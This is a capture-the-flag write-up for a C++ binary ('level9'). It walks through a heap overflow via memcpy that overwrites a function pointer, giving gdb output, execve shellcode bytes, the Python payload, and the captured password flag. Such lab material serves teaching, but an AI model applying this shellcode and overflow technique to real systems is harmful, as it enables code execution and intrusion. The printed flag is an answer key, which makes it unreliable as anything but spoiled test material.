## LEVEL 9
---
### Starting from now, you will find explanations in the disassembled file for each line in few upcoming levels. This will provide a better understanding of the payload and the solution.
---

This level is a little more spacial...
```shell
$ objdump -p level9
  required from libstdc++.so.6:
    0x056bafd3 0x00 05 CXXABI_1.3
    0x08922974 0x00 03 GLIBCXX_3.4
```

Yes this level isn't C but C++.

The asm file can have some errors because of the language, C++ is way more complex than C to disassemble. For this particular level I used Ghidra to help me to dissassemble the code. But I will stil use the dissassembled code because some parts are not explained in the C++ code.

The first thing to do is to find the vulnerability. Here are all the lines of code below the first argument usage, as it's the only thing that could be interesting for sending a payload.

```cpp
	n1_ptr->setAnnotation(argv[1]);
	return ((n2_ptr)->operator+(*n1_ptr));
```

The only usage of the arguments is in the `setAnnotation()` function. Let's disassemble it because I suspect this function may have a vulnerability.

```shell
    0x08048733 <+37>:	call   0x8048510 <memcpy@plt> ; Call the memcpy function
    {
        memcpy(this->var, n, strlen(n));
    }
```

This `memcpy` function can overwrite heap memory if the argument number 1 is too long. Let's see what we can overwrite. Here are the allocations in our program:


```shell
[...]
    0x08048610 <+28>:	movl   $0x6c,(%esp)
    0x08048617 <+35>:	call   0x8048530 <_Znwj@plt>
[...]
    0x08048632 <+62>:	movl   $0x6c,(%esp)
    0x08048639 <+69>:	call   0x8048530 <_Znwj@plt>
[...]
```

The program allocates two blocks of 108 bytes each. The first allocation is `n1`, and the second is `n2`. As we previously observed, the heap allocates memory in chunks. Therefore, if I overflow the first allocation, I can overwrite the second one. Now you might be wondering why it's useful to overflow the second allocation. Here's why:

```shell
   0x0804867c <+136>:	mov    0x10(%esp),%eax
[...]
   0x08048682 <+142>:	mov    (%eax),%edx
[...]
   0x0804868c <+152>:	mov    0x10(%esp),%eax
   0x08048690 <+156>:	mov    %eax,(%esp)
   0x08048693 <+159>:	call   *%edx
```

The program calls the function pointer stored in the second allocation. Therefore, if I overwrite the second allocation, I can invoke any function of my choice. Great, we're almost done. Now I need to determine which function I want to call. After using the `info func` command, I discovered that the program doesn't have the `system` function compiled. Hence, I will need to use a shellcode to obtain a shell.

Now that we have all the necessary knowledge to exploit the program, let's write the payload.

1. We need to overflow the first allocation to overwrite the second one. I need the lenght between the first allocation and the pointer readed by the program. I will use gdb to find it.

```shell
(gdb) b *0x08048677
Breakpoint 1 at 0x8048677
(gdb) r AAAA
Starting program: /home/user/level9/level9 hi

Breakpoint 1, 0x08048677 in main ()
(gdb) x/a $esp+16
0xbffff710:	0x804a078
(gdb) x/a $esp+20
0xbffff714:	0x804a008
(gdb) x/x 0x804a008+4
0x804a00c:	0x41414141
```

So the distance between these two addresses is 0x6b which is 108 in decimal. So I need to overflow the first allocation with 108 bytes. And the shellcode will be stored at `0x804a00b`.

2. Get the shellcode

I will use the same shellcode as the level 2 because the system is similar.

```shell
\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
```

We can know create the payload, and try it in GDB.

```shell
$ python -c 'print("\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x90" * 87 + "\x0c\xa0\x04\x08")' > /tmp/payload
(gdb) r $(cat /tmp/payload)
Single stepping until exit from function main,
which has no line number information.

Program received signal SIGSEGV, Segmentation fault.
0x580b6a08 in ?? ()
```

Oh, it seems that the program crashed. Let's understand why, for that I will print $edx right before the call.

```shell
(gdb) x/x $edx
0x580b6a08:	Cannot access memory at address 0x580b6a08
```

It appears that `$edx` is not a valid address, but it represents the address of the shellcode. To address this issue, we need to replace the shellcode at the beginning with an address that points to the shellcode. To do that, I will place the address at the beginning of the string. This address will be the same address that I used to overwrite the second allocation, plus 4 bytes.

```shell
$ python -c 'print("\x10\xa0\x04\x08" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x90" * 83 + "\x0c\xa0\x04\x08")' > /tmp/payload
$ echo "cat /home/user/bonus0/.pass" | ./level9 $(cat /tmp/payload)
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```shell